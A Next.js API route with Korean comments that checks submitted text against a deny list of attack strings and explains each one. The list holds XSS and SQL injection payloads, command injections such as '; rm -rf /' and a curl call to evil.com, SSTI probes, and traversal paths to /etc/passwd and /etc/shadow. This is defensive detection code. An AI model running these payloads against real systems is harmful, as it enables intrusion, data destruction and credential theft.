import { NextResponse } from 'next/server'

/**
 * 금지 문자열별 상세 설명 매핑
 * (dangerGroups 전체를 모두 포함)
 */
const dangerDescriptions: Record<string, string> = {
  // XSS
  '<script>':
    'HTML에 스크립트를 삽입하여 XSS 공격을 유발할 수 있는 태그입니다.',
  'javascript:alert(1)':
    'javascript 스킴을 악용하여 스크립트를 실행하는 XSS 기법입니다.',
  '<img src=x onerror=alert(1)>':
    '이미지 로딩 오류를 유발해 스크립트를 실행시키는 XSS 페이로드입니다.',
  '<iframe>':
    '외부 악성 페이지를 불러와 피싱·클릭재킹 공격에 사용될 수 있습니다.',
  '<svg onload=alert(1)>': 'SVG의 onload 이벤트를 이용한 XSS 공격입니다.',
  '<body onload=alert(1)>':
    '페이지 로드 시 스크립트를 실행시키는 이벤트 기반 XSS입니다.',
  '<details open ontoggle=alert(1)>':
    'details 태그 이벤트를 악용한 최신 XSS 공격입니다.',
  '<link rel=import href="javascript:alert(1)">':
    'HTML Import 기능을 이용해 스크립트를 실행시키는 XSS 페이로드입니다.',

  // SQL Injection
  "' OR 1=1 --":
    '항상 참이 되는 조건을 넣어 인증 또는 데이터 접근을 우회하는 SQL Injection 기법입니다.',
  'UNION SELECT *':
    'UNION 구문을 이용해 다른 테이블의 데이터를 결합해 조회하는 SQL Injection입니다.',
  'drop table users': '중요 테이블을 삭제하는 파괴적 SQL Injection 공격입니다.',
  '" OR "" = "':
    '문자열 비교를 무력화하여 인증 우회에 사용하는 SQL Injection 기법입니다.',
  "admin'--":
    '뒤 문장을 주석 처리해 로그인 우회를 시도하는 SQL Injection입니다.',
  "' OR 'a'='a'":
    '항상 참이 되는 조건을 사용하여 인증을 우회하는 SQL Injection입니다.',
  "'; shutdown --":
    '데이터베이스 서버를 중지시키는 치명적인 SQL Injection입니다.',
  "' OR 1=1 LIMIT 1":
    '조건을 우회해 민감한 데이터를 특정 개수만 조회하는 SQL Injection입니다.',

  // 특수문자 / 위험 패턴 / SSTI
  '< > \' "': 'HTML 구조를 깨뜨려 XSS 공격에 악용될 수 있는 특수문자입니다.',
  '&{}[]': '템플릿 엔진 또는 JSON 파싱 구조를 깨뜨리는 위험 문자를 포함합니다.',
  '@#$%^&*~': '명령 인젝션 또는 필터 우회에 악용될 수 있는 특수문자입니다.',
  '\\..\\': '디렉토리 트래버설 공격에 사용되는 경로 이탈 문자열입니다.',
  '${7*7}':
    '템플릿 엔진에서 코드 실행을 유발하는 SSTI(Server-Side Template Injection) 패턴입니다.',
  '${{7*7}}': '중첩된 템플릿 구조로 강력한 SSTI 공격을 유발할 수 있습니다.',
  '%0A': '개행 문자로 요청 분할(Request Smuggling)에 악용될 수 있습니다.',
  '%3Cscript%3E': 'URL 인코딩된 XSS 페이로드로 필터 우회에 사용됩니다.',

  // Command Injection
  '; rm -rf /':
    '리눅스 시스템 전체 파일을 삭제하는 매우 위험한 명령 인젝션입니다.',
  '| cat /etc/passwd': '시스템 계정 정보를 유출하는 명령 인젝션 공격입니다.',
  '&& whoami': '서버에서 실행 사용자를 노출시키는 명령 인젝션입니다.',
  '$(ls)': '쉘 명령어 중첩 실행을 통한 서버 정보 탈취 공격입니다.',
  '`ls`': '백틱 기반 명령 실행으로 서버 제어권을 탈취할 수 있습니다.',
  '; curl http://evil.com':
    '외부 서버와 통신해 데이터 유출 또는 멀웨어 다운로드를 유도하는 공격입니다.',

  // Directory Traversal
  '../../../../etc/passwd':
    '상위 폴더로 이동해 시스템 파일에 접근하는 디렉토리 트래버설 공격입니다.',
  '..%2f..%2fetc/passwd':
    'URL 인코딩을 이용해 필터 우회하는 디렉토리 트래버설 페이로드입니다.',
  '/etc/shadow':
    '암호화된 시스템 계정 정보가 들어 있는 파일에 접근하는 위험 공격입니다.',
  'C:\\Windows\\System32':
    'Windows 시스템 핵심 디렉토리에 접근하려는 공격입니다.',
  '../config/database.yml':
    'DB 접속 정보가 포함된 파일에 접근하려는 디렉토리 조작 공격입니다.',
}

/**
 * 실제 금지 문자열 목록 (dangerGroups에 있던 것 그대로 통합)
 */
const forbiddenPatterns = Object.keys(dangerDescriptions)

export async function POST(req: Request) {
  const { text } = await req.json()

  const reasons: string[] = []
  const details: any[] = []

  // 허용 문자 검증 (원하면 확장 가능)
  const allowedRegex = /^[a-zA-Z0-9가-힣\s.,!?@#%&()_\-=+*<>;'"/\\{}\[\]~]*$/
  if (!allowedRegex.test(text)) {
    reasons.push('허용되지 않은 문자가 포함되어 있습니다.')
  }

  // 금지 패턴 탐지
  for (const pattern of forbiddenPatterns) {
    if (text.includes(pattern.replace(/\\/g, ''))) {
      reasons.push(`금지된 패턴 '${pattern}'이 포함되어 있습니다.`)
      details.push({
        pattern,
        description: dangerDescriptions[pattern],
      })
    }
  }

  const valid = reasons.length === 0

  return NextResponse.json({
    valid,
    reasons,
    details,
  })
}
